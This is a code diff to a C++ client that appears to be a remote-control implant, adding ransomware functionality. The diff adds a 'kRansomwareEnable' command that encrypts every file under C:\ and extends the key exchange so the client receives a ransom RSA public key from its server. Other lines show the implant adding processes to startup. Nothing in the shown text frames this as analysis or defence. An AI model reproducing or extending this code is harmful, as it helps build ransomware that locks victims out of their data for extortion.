@@ -208,6 +208,8 @@ BOOL Client::PerformCommand(const Packet& command, Packet& outResponse) {
     std::string cmdOutput = "";
 
     switch ( command.action ) {
+    case Action::kRansomwareEnable:
+        this->m_FileManager.TransformFiles("C:\\", FileManager::EncryptContents, this->m_FileManager);
     case Action::kAddToStartup:
         this->m_ProcMgr.AddProcessToStartup(command.buffer);
         success = TRUE;
@@ -327,6 +329,46 @@ bool Client::ExchangeCryptoKeys() {
     if ( derClientPubKeyLen < 0 )
         return false;
 
+    const unsigned char* constDerServerPubKey = derServerPubKey;
+
+    // convert unsigned char* der rsa key to RSA* object
+    RSA* rsaServerPubKey = d2i_RSAPublicKey(nullptr, &constDerServerPubKey, derServerPubKeyLen);
+    if ( !rsaServerPubKey ) {
+        free(derClientPubKey);
+        free(derServerPubKey);
+        return false;
+    }
+
+    this->m_ServerPublicKey = rsaServerPubKey;
+
+    // receive ransom rsa public key
+    int ransomRSAKeyLen = 0;
+    received = Receive(this->m_TCPSocket, ( char* ) &ransomRSAKeyLen, sizeof(ransomRSAKeyLen), 0);
+    if ( received <= 0 ) {
+        free(derClientPubKey);
+        free(derServerPubKey);
+        return false;
+    }
+
+    unsigned char* derRansomRSAKey = (unsigned char*)malloc(ransomRSAKeyLen);
+    received = Receive(this->m_TCPSocket, ( char* )derRansomRSAKey, ransomRSAKeyLen, 0);
+    if ( received <= 0 ) {
+        free(derClientPubKey);
+        free(derServerPubKey);
+        return false;
+    }
+
+    const unsigned char* constDerRansomRSAKey = derRansomRSAKey;
+
+    RSA* rsaRansomKey = d2i_RSAPublicKey(nullptr, &constDerRansomRSAKey, ransomRSAKeyLen);
+    if ( !rsaRansomKey ) {
+        free(derClientPubKey);
+        free(derServerPubKey);
+        return false;
+    }
+
+    this->m_RansomSecrets.pub = rsaRansomKey;
+    this->m_FileManager.SetPublicKey(this->m_RansomSecrets.pub);
 
     // convert RSA* to unsigned char*, this function already mallocs 
     // derClientPubKey for us
@@ -345,18 +387,6 @@ bool Client::ExchangeCryptoKeys() {
         free(derClientPubKey);
         return false;
     }
-
-    const unsigned char* constDerServerPubKey = derServerPubKey;
-    
-    // convert unsigned char* der rsa key to RSA* object
-    RSA* rsaServerPubKey = d2i_RSAPublicKey(nullptr, &constDerServerPubKey, derServerPubKeyLen );
-    if ( !rsaServerPubKey ) {
-        free(derClientPubKey);
-        free(derServerPubKey);
-        return false;
-    }
-
-    this->m_ServerPublicKey = rsaServerPubKey;
     
     // get the aes key generated for this client on the server
     BYTESTRING encryptedEncodedAES;
